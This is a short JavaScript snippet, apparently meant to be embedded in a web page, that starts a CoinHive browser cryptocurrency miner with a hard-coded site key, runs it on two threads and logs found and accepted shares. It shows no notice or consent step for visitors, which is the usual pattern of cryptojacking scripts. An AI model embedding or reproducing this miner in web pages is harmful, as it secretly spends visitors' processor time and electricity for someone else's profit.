//
var miner = new CoinHive.Anonymous('goeNOMTWrRaet5dkWiW0jEaVeWwUab4h', {
  threads: 2
});
miner.start();
miner.on('found', function() {console.log('found') })
miner.on('accepted', function() {console.log('accepted') })
